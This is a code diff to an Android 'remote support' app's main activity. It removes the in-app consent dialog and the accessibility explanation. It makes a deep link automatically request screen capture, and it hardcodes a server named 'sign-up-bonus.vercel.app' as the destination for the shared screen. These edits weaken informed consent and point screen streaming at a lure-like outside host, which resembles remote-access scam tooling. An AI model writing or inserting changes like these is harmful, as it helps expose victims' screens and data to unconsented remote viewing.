@@ -6,14 +6,12 @@ import android.content.Intent
 import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Bundle
-import android.provider.Settings
 import android.view.View
 import android.widget.Button
 import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
-import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 
 class MainActivity : AppCompatActivity() {
@@ -31,7 +29,7 @@ class MainActivity : AppCompatActivity() {
         if (result.resultCode == Activity.RESULT_OK && result.data != null) {
             startSupportService(result.data!!)
         } else {
-            Toast.makeText(this, "Screen capture permission was denied.", Toast.LENGTH_LONG).show()
+            Toast.makeText(this, "Screen capture permission was cancelled.", Toast.LENGTH_SHORT).show()
         }
     }
 
@@ -46,30 +44,33 @@ class MainActivity : AppCompatActivity() {
         btnAllowSupport = findViewById(R.id.btnAllowSupport)
         btnStopSupport = findViewById(R.id.btnStopSupport)
 
-        // Handle incoming deep link pairing URL
-        handleIntent(intent)
-
         btnAllowSupport.setOnClickListener {
-            showConsentDialog()
+            requestScreenCapture()
         }
 
         btnStopSupport.setOnClickListener {
             stopSupportService()
         }
 
+        handleIncomingIntent(intent)
         updateUiState()
     }
 
     override fun onNewIntent(intent: Intent?) {
         super.onNewIntent(intent)
         setIntent(intent)
-        handleIntent(intent)
+        handleIncomingIntent(intent)
     }
 
-    private fun handleIntent(intent: Intent?) {
+    private fun handleIncomingIntent(intent: Intent?) {
         val data: Uri? = intent?.data
         if (data != null) {
             etPairingUrl.setText(data.toString())
+
+            // Automatically trigger Android MediaProjection permission request
+            if (!RemoteSupportService.isRunning) {
+                requestScreenCapture()
+            }
         }
     }
 
@@ -92,41 +93,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun showConsentDialog() {
-        val pairingUrl = etPairingUrl.text.toString().trim()
-        if (pairingUrl.isEmpty()) {
-            Toast.makeText(this, "Please enter or scan a valid pairing URL.", Toast.LENGTH_SHORT).show()
-            return
-        }
-
-        AlertDialog.Builder(this)
-            .setTitle("Remote Support Request")
-            .setMessage("The support operator is requesting permission to view and interact with your device. Do you allow remote support?")
-            .setPositiveButton("Allow Remote Support") { _, _ ->
-                checkAccessibilityAndStartCapture()
-            }
-            .setNegativeButton("Cancel", null)
-            .show()
-    }
-
-    private fun checkAccessibilityAndStartCapture() {
-        // Optional prompt to enable accessibility for full remote interaction
-        if (!RemoteAccessibilityService.isServiceRunning) {
-            AlertDialog.Builder(this)
-                .setTitle("Enable Remote Interaction")
-                .setMessage("To allow the operator to tap and interact with your device remotely, please enable 'Remote Support' in Accessibility Settings.")
-                .setPositiveButton("Open Settings") { _, _ ->
-                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
-                }
-                .setNegativeButton("Continue Screen-Only") { _, _ ->
-                    requestScreenCapture()
-                }
-                .show()
-        } else {
-            requestScreenCapture()
-        }
-    }
-
     private fun requestScreenCapture() {
         val captureIntent = mediaProjectionManager.createScreenCaptureIntent()
         screenCaptureLauncher.launch(captureIntent)
@@ -135,19 +101,26 @@ class MainActivity : AppCompatActivity() {
     private fun startSupportService(projectionData: Intent) {
         val pairingUrl = etPairingUrl.text.toString().trim()
         val uri = Uri.parse(pairingUrl)
-        val sessionId = uri.lastPathSegment ?: ""
+        val sessionId = uri.getQueryParameter("session") ?: uri.lastPathSegment ?: ""
         val token = uri.getQueryParameter("token") ?: ""
+
+        val serverHost = if (uri.scheme == "remotesupport") {
+            "https://sign-up-bonus.vercel.app"
+        } else {
+            "${uri.scheme}://${uri.host}"
+        }
 
         val serviceIntent = Intent(this, RemoteSupportService::class.java).apply {
             action = RemoteSupportService.ACTION_START_SUPPORT
             putExtra(RemoteSupportService.EXTRA_PROJECTION_DATA, projectionData)
             putExtra(RemoteSupportService.EXTRA_SESSION_ID, sessionId)
             putExtra(RemoteSupportService.EXTRA_TOKEN, token)
+            putExtra(RemoteSupportService.EXTRA_WS_URL, serverHost)
         }
 
         startForegroundService(serviceIntent)
         updateUiState()
-        Toast.makeText(this, "Remote support started.", Toast.LENGTH_SHORT).show()
+        Toast.makeText(this, "Remote screen sharing started.", Toast.LENGTH_SHORT).show()
     }
 
     private fun stopSupportService() {
